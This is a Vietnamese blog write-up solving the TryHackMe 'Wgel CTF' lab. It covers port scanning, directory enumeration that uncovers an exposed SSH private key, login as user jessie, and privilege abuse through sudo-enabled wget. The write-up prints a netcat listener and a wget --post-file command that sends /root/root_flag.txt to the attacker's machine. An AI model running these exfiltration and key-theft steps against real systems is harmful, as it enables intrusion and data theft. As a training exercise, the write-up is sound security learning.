---
title: "Tryhackme - Wgel CTF"
date: "2021-09-30"
tags: [
    "web",
    "linux",
    "ssh",
    "wget"
]
---

Hôm nay tôi sẽ giải CTF [Tryhackme - Wgel CTF](https://tryhackme.com/room/wgelctf). Géc gô!!!

## Reconnaissance

Vẫn như thông thường thôi, việc đầu tiên cần làm là quét cổng. 

```python
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpgV7/18RfM9BJUBOcZI/eIARrxAgEeD062pw9L24Ulo5LbBeuFIv7hfRWE/kWUWdqHf082nfWKImTAHVMCeJudQbKtL1SBJYwdNo6QCQyHkHXslVb9CV1Ck3wgcje8zLbrml7OYpwBlumLVo2StfonQUKjfsKHhR+idd3/P5V3abActQLU8zB0a4m3TbsrZ9Hhs/QIjgsEdPsQEjCzvPHhTQCEywIpd/GGDXqfNPB0Yl/dQghTALyvf71EtmaX/fsPYTiCGDQAOYy3RvOitHQCf4XVvqEsgzLnUbqISGugF8ajO5iiY2GiZUUWVn4MVV1jVhfQ0kC3ybNrQvaVcXd
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDCxodQaK+2npyk3RZ1Z6S88i6lZp2kVWS6/f955mcgkYRrV1IMAVQ+jRd5sOKvoK8rflUPajKc9vY5Yhk2mPj8=
|   256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJhXt+ZEjzJRbb2rVnXOzdp5kDKb11LfddnkcyURkYke
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Với port 80 tôi có 1 default page apache ubuntu server. Lướt qua page thì có 1 chút kỳ lạ, tôi xem qua source code:

*`<!-- Jessie don't forget to udate the webiste -->`*

Tiếp tục dùng [dirsearch](https://github.com/maurosoria/dirsearch) để tìm web path và tôi tìm được */sitemap/*. Vào url thì đây là một blog html, cũng không có gì đặc biệt. Tôi thử check thông tin site:

```python
http://10.10.253.207/sitemap/ [200 OK] Apache[2.4.18], Bootstrap, Country[RESERVED][ZZ], Email[info@yoursite.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.253.207], JQuery, Modernizr[2.6.2.min], Open-Graph-Protocol, Script, Title[unapp Template], X-UA-Compatible[IE=edge]
```
Tôi thấy có Modernizr [2.6.2.min], đây là một thư viện java nên thử tìm xem có exploit nào không, tuy nhiên cũng không có gì hữu ích.
Vậy nên tôi thử tìm web path thêm lần nữa để xem ở sau */sitemap/* có gì không.

```python
200 -  955B  - /sitemap/.ssh/
200 -    2KB - /sitemap/.ssh/id_rsa
```
## SSH
Tôi sẽ thử tải ssh key này về vào login bằng username *Jessie* đã tìm được ở trên. 

```python
┌─[neo@parrot]─[~]
└──╼ $sudo ssh -i id_rsa jessie@10.10.20.15
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
8 packages can be updated.
8 updates are security updates.
Last login: Tue Jul 19 11:45:25 2022 from 10.18.3.74
jessie@CorpOne:~$ 
```
Và tôi tìm được __user flag__ trong thư mục *Document*

```python
jessie@CorpOne:~/Documents$ ls
user_flag.txt
```
## Privilege escalation
Thử check xem Jessie có truy cập file nào với quyền root hay không

```python
User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```
Qua [GTFOBins](https://gtfobins.github.io/) để tìm wget. Có vẻ như với wget chúng ta có thể tải file về local machine.
Tôi sẽ thử dùng nó để tải root flag trong thư mục root. Và với tên *user_flag* thì tôi nghĩ root flag cũng sẽ có kiểu format như thế này. 

Thử tạo listener trên local machine và lưu dữ liệu vào file __flag__ 

```python
┌─[neo@parrot]─[~]
└──╼ $sudo nc -lnvp 80 > flag
```
Sau đó tạo 1 POST request từ remote machine đến local machine.

```python
jessie@CorpOne:/etc$ sudo /usr/bin/wget --post-file=/root/root_flag.txt 10.18.3.74
```
Mở file __flag__ và tôi có root flag. Còn để leo thang đặc quyền bằng wget tôi sẽ nói ở 1 bài sau.

## Tổng kết

Thực sự thì bài này không có kỹ thuật gì mới, chú yếu là để luyện thêm về recon, cách login ssh bằng rsa key, sử dụng wget để lấy được file về local machine và sau đó có thể get root bằng cách đẩy file chứa password của mình.




